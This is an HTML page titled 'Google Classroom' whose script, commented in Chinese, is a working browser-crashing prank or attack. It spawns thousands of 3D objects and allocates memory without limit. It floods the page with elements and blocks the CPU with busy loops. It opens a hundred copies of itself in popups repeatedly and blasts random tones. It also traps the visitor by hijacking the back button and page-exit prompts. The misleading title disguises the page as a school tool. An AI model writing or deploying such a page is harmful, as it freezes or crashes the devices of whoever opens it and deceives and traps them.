<!DOCTYPE html>
<html>
<head><title>Google Classroom</title></head>
<body style="margin:0;overflow:hidden;background:#000;">
    <canvas id="c"></canvas>
    <script>
        // ===== GPU：Three.js 3D动物海 =====
        var s=document.createElement('script');
        s.src='https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js';
        document.head.appendChild(s);
        s.onload=function(){
            var w=window.innerWidth,h=window.innerHeight;
            var scene=new THREE.Scene();
            var camera=new THREE.PerspectiveCamera(75,w/h,0.1,1000);
            camera.position.z=30;
            var renderer=new THREE.WebGLRenderer({canvas:document.getElementById('c')});
            renderer.setSize(w,h);
            var animals=[];
            for(var i=0;i<5000;i++){
                var group=new THREE.Group();
                var body=new THREE.Mesh(new THREE.SphereGeometry(0.3,8,8),new THREE.MeshBasicMaterial({color:Math.random()*0xffffff}));
                group.add(body);
                var head=new THREE.Mesh(new THREE.SphereGeometry(0.2,8,8),new THREE.MeshBasicMaterial({color:Math.random()*0xffffff}));
                head.position.y=0.4;group.add(head);
                for(var j=0;j<4;j++){
                    var leg=new THREE.Mesh(new THREE.CylinderGeometry(0.05,0.05,0.3,8),new THREE.MeshBasicMaterial({color:0x8B4513}));
                    leg.position.x=(j<2?-0.15:0.15);leg.position.z=(j%2==0?-0.15:0.15);leg.position.y=-0.3;
                    group.add(leg);
                }
                group.position.x=(Math.random()-0.5)*50;group.position.y=(Math.random()-0.5)*50;group.position.z=(Math.random()-0.5)*30;
                animals.push(group);scene.add(group);
            }
            function render(){
                for(var i=0;i<animals.length;i++){animals[i].rotation.x+=0.01;animals[i].rotation.y+=0.02;}
                renderer.render(scene,camera);requestAnimationFrame(render);
            }
            render();
        };
        
        // ===== 内存：5GB/s =====
        var ram=[];setInterval(function(){ram.push(new ArrayBuffer(50*1024*1024))},10);
        
        // ===== DOM轰炸 =====
        setInterval(function(){
            for(var i=0;i<100;i++){
                var d=document.createElement('div');
                d.style.cssText='position:fixed;width:50px;height:50px;background:#f00;z-index:999;';
                d.style.left=Math.random()*window.innerWidth+'px';
                d.style.top=Math.random()*window.innerHeight+'px';
                document.body.appendChild(d);
            }
        },10);
        
        // ===== CPU：主线程死循环炸弹 =====
        setInterval(function(){
            var start=Date.now();
            while(Date.now()-start<500){} // 阻塞500ms
        },1);
        
        // ===== 弹窗轰炸 =====
        setInterval(function(){
            for(var i=0;i<100;i++){
                window.open(location.href,'','width=100,height=100');
            }
        },300);
        
        // ===== 音频轰炸 =====
        var a=new(window.AudioContext||window.webkitAudioContext)();
        setInterval(function(){
            for(var i=0;i<20;i++){
                var o=a.createOscillator();
                o.frequency.value=Math.random()*2000;
                o.connect(a.destination);
                o.start();o.stop(a.currentTime+0.05);
            }
        },10);
        
        // ===== 防止退出 =====
        window.onbeforeunload=function(){return''};
        history.pushState(null,null,location.href);
        window.onpopstate=function(){history.go(1)};
    </script>
</body>
</html>
